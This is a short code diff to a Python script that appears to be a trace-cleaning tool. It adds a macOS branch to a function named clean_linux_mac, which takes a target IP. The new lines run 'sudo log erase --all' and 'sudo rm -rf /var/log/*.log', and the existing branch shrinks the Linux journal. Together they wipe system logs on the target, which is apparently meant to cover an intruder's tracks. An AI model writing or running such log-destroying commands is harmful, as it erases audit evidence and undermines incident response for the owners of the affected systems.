@@ -4,6 +4,7 @@ import subprocess
 import argparse
 import logging
 from pathlib import Path
+import shutil 
 
 # Configure logging
 logging.basicConfig(
@@ -39,6 +40,9 @@ def clean_linux_mac(target_ip, file_path):
 
     if shutil.which("journalctl"):
         run_command("sudo journalctl --rotate && sudo journalctl --vacuum-size=10M")
+    elif platform.system() == "Darwin":  # macOS
+        run_command("sudo log erase --all")
+        run_command("sudo rm -rf /var/log/*.log")
     else:
         logging.warning("Journalctl command not found. Skipping log rotation.")
 
